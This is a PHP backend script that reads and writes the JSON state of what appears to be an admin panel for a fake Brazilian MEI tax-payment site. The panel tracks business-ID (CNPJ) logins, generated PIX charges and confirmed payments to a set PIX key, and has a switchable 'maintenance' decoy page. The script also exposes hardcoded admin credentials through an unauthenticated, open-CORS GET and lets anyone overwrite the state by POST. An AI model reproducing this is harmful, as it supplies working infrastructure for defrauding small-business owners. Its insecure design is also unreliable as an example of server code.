<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

$rootDir = dirname(__DIR__);
$stateFile = $rootDir . DIRECTORY_SEPARATOR . 'app-state.json';

$defaultState = [
    'admin' => [
        'username' => 'macaco',
        'password' => 'macaquinhoronald',
    ],
    'analytics' => [
        'visits' => 0,
        'uniqueVisitors' => 0,
        'totalClicks' => 0,
        'cnpjLogins' => 0,
        'pixGenerated' => 0,
        'paymentsConfirmed' => 0,
        'activePage' => 'primary',
        'primaryDomain' => 'albuquerqueconsultoriameidas.com',
        'pixKey' => '6769b9cc-dae0-46f1-88db-3144cc4a7ca7',
        'pixMerchantName' => 'SERVICO EMPRESARIAL ASSEGURADO ILTDA',
        'pixMerchantCity' => 'SAO PAULO',
        'secondaryTitle' => 'Estamos em manutencao',
        'secondaryMessage' => 'A equipe da Albuquerque Consultoria MEI DAS esta realizando melhorias para oferecer uma experiencia mais rapida, segura e confiavel. Em breve o atendimento sera retomado.',
        'lastVisitAt' => '',
        'lastPaymentAt' => '',
        'accessLog' => [],
        'payments' => [],
    ],
];

function merge_state(array $defaultState, array $rawState): array
{
    return [
        'admin' => array_merge($defaultState['admin'], $rawState['admin'] ?? []),
        'analytics' => array_merge($defaultState['analytics'], $rawState['analytics'] ?? []),
    ];
}

function read_state(string $stateFile, array $defaultState): array
{
    if (!file_exists($stateFile)) {
        file_put_contents(
            $stateFile,
            json_encode($defaultState, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES)
        );
        return $defaultState;
    }

    $raw = file_get_contents($stateFile);
    $decoded = json_decode($raw, true);

    if (!is_array($decoded)) {
        return $defaultState;
    }

    return merge_state($defaultState, $decoded);
}

function write_state(string $stateFile, array $state): array
{
    file_put_contents(
        $stateFile,
        json_encode($state, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES)
    );

    return $state;
}

$currentState = read_state($stateFile, $defaultState);

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    echo json_encode($currentState, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $payload = file_get_contents('php://input');
    $decoded = json_decode($payload, true);

    if (!is_array($decoded)) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid state payload'], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        exit;
    }

    $nextState = merge_state($defaultState, $decoded);
    $savedState = write_state($stateFile, $nextState);
    echo json_encode($savedState, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

http_response_code(405);
echo json_encode(['error' => 'Method not allowed'], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
